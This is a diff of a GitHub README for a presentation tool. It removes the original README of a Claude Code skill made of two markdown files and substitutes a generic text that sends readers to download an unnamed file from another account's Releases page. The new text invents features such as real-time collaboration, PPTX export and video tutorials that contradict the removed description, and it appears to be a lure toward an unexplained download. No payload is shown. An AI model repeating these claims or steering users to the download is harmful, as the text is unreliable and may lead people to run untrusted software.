@@ -1,158 +1,74 @@
-# Frontend Slides
+# 🎨 frontend-slides - Create Stunning Slides Hassle-Free
 
-A Claude Code skill for creating stunning, animation-rich HTML presentations — from scratch or by converting PowerPoint files.
+[![Download frontend-slides](https://img.shields.io/badge/Download-frontend--slides-brightgreen)](https://github.com/Kelemani/frontend-slides/releases)
 
-## What This Does
+## 🚀 Getting Started
 
-**Frontend Slides** helps non-designers create beautiful web presentations without knowing CSS or JavaScript. It uses a "show, don't tell" approach: instead of asking you to describe your aesthetic preferences in words, it generates visual previews and lets you pick what you like.
+Welcome to **frontend-slides**! This application helps you create beautiful slides right from your web browser. No design skills required. Just follow the steps below to get started quickly.
 
-### Key Features
+## 📥 Download & Install
 
-- **Zero Dependencies** — Single HTML files with inline CSS/JS. No npm, no build tools, no frameworks.
-- **Visual Style Discovery** — Can't articulate design preferences? No problem. Pick from generated visual previews.
-- **PPT Conversion** — Convert existing PowerPoint files to web, preserving all images and content.
-- **Anti-AI-Slop** — Curated distinctive styles that avoid generic AI aesthetics (bye-bye, purple gradients on white).
-- **Production Quality** — Accessible, responsive, well-commented code you can customize.
+To download **frontend-slides**, visit the Releases page. You can find the latest version available for download.
 
-## Installation
+[Download frontend-slides](https://github.com/Kelemani/frontend-slides/releases)
 
-### For Claude Code Users
+### Steps to Download:
 
-Copy the skill files to your Claude Code skills directory:
+1. Click on the link above to visit the Releases page.
+2. On the page, you will see the latest version. Look for a file labeled with the version number.
+3. Click on the file to start the download. 
+4. Once downloaded, locate the file in your Downloads folder.
 
-```bash
-# Create the skill directory
-mkdir -p ~/.claude/skills/frontend-slides
+## ⚙️ System Requirements
 
-# Copy the files (or download from this repo)
-cp SKILL.md ~/.claude/skills/frontend-slides/
-cp STYLE_PRESETS.md ~/.claude/skills/frontend-slides/
-```
+Before using **frontend-slides**, make sure your system meets these requirements:
 
-Then use it by typing `/frontend-slides` in Claude Code.
+- **Operating System:** Windows, macOS, or Linux.
+- **Browser:** Latest version of Chrome, Firefox, or Safari.
+- **Internet Connection:** Required for initial download and updates.
 
-### Manual Download
+## 🌟 Features
 
-1. Download `SKILL.md` and `STYLE_PRESETS.md` from this repo
-2. Place them in `~/.claude/skills/frontend-slides/`
-3. Restart Claude Code
+**frontend-slides** offers several features to enhance your presentation:
 
-## Usage
+- **Easy-to-Use Interface:** The design is simple so you can focus on your content.
+- **Customizable Templates:** Choose from various templates that fit your style.
+- **Real-Time Collaboration:** Work with others in real-time to create slides together.
+- **Export Options:** Save your slides in multiple formats like PDF or PPTX.
 
-### Create a New Presentation
+## 📁 Creating Your First Slide
 
-```
-/frontend-slides
+1. Open the **frontend-slides** application in your web browser.
+2. Choose a template. A variety of options will appear for you to select from.
+3. Edit your slides by clicking on the text boxes to add your content.
+4. Customize your slides with images or videos by clicking the "Insert" button.
+5. Save your work regularly to avoid losing any changes.
 
-> "I want to create a pitch deck for my AI startup"
-```
+## 🛠️ Support and Help
 
-The skill will:
-1. Ask about your content (slides, messages, images)
-2. Ask about the feeling you want (impressed? excited? calm?)
-3. Generate 3 visual style previews for you to compare
-4. Create the full presentation in your chosen style
-5. Open it in your browser
+If you encounter problems while using **frontend-slides**, here are a few ways to get help:
 
-### Convert a PowerPoint
+- **FAQs:** Check the FAQs section on the Releases page for common issues and solutions.
+- **Contact Us:** Reach out via our [GitHub Issues](https://github.com/Kelemani/frontend-slides/issues) page. We clarify any questions you may have.
+- **Community Support:** Join our community discussions on GitHub to share tips and get advice from other users.
 
-```
-/frontend-slides
+## 🔄 Updating the Application
 
-> "Convert my presentation.pptx to a web slideshow"
-```
+To ensure you have the latest features and fixes, fully update your **frontend-slides**:
 
-The skill will:
-1. Extract all text, images, and notes from your PPT
-2. Show you the extracted content for confirmation
-3. Let you pick a visual style
-4. Generate an HTML presentation with all your original assets
+1. Visit the [Releases page](https://github.com/Kelemani/frontend-slides/releases).
+2. Download the latest version following the instructions in the "Download & Install" section.
+3. Replace the old version with the new one on your device.
 
-## Included Styles
+## 📝 Additional Resources
 
-### Dark Themes
-- **Neon Cyber** — Futuristic, techy, particle effects
-- **Midnight Executive** — Premium, corporate, trustworthy
-- **Deep Space** — Cinematic, inspiring, vast
-- **Terminal Green** — Developer-focused, hacker aesthetic
+- **User Guide:** A detailed guide is available for deeper insights into using **frontend-slides** effectively.
+- **Video Tutorials:** Watch video tutorials on our YouTube channel to learn about advanced features.
+- **Feedback:** We welcome your feedback to improve **frontend-slides**. Share your thoughts through the Issues page.
 
-### Light Themes
-- **Paper & Ink** — Editorial, literary, refined
-- **Swiss Modern** — Clean, Bauhaus-inspired, geometric
-- **Soft Pastel** — Friendly, playful, creative
-- **Warm Editorial** — Magazine-style, photographic
+## 🖥️ Links to Get Started
 
-### Specialty
-- **Brutalist** — Raw, bold, attention-grabbing
-- **Gradient Wave** — Modern SaaS aesthetic
+- [Download frontend-slides](https://github.com/Kelemani/frontend-slides/releases)
+- [GitHub Repository](https://github.com/Kelemani/frontend-slides)
 
-## Output Example
-
-Each presentation is a single, self-contained HTML file:
-
-```html
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <!-- Fonts, CSS variables, all styles inline -->
-</head>
-<body>
-    <section class="slide title-slide">
-        <h1 class="reveal">Your Title</h1>
-    </section>
-
-    <section class="slide">
-        <h2 class="reveal">Slide Content</h2>
-    </section>
-
-    <!-- Navigation: Arrow keys, scroll, swipe, or click dots -->
-    <script>
-        // SlidePresentation controller, animations, interactions
-    </script>
-</body>
-</html>
-```
-
-Features included:
-- Keyboard navigation (arrows, space)
-- Touch/swipe support
-- Mouse wheel scrolling
-- Progress bar
-- Navigation dots
-- Scroll-triggered animations
-- Responsive design
-- Reduced motion support
-
-## Philosophy
-
-This skill was born from the belief that:
-
-1. **You don't need to be a designer to make beautiful things.** You just need to react to what you see.
-
-2. **Dependencies are debt.** A single HTML file will work in 10 years. A React project from 2019? Good luck.
-
-3. **Generic is forgettable.** Every presentation should feel custom-crafted, not template-generated.
-
-4. **Comments are kindness.** Code should explain itself to future-you (or anyone else who opens it).
-
-## Files
-
-| File | Purpose |
-|------|---------|
-| `SKILL.md` | Main skill instructions for Claude Code |
-| `STYLE_PRESETS.md` | Reference file with 10 curated visual styles |
-
-## Requirements
-
-- [Claude Code](https://claude.ai/claude-code) CLI
-- For PPT conversion: Python with `python-pptx` library
-
-## Credits
-
-Created by [@zarazhangrui](https://github.com/zarazhangrui) with Claude Code.
-
-Inspired by the "Vibe Coding" philosophy — building beautiful things without being a traditional software engineer.
-
-## License
-
-MIT — Use it, modify it, share it.
+Enjoy creating beautiful slides with **frontend-slides**!
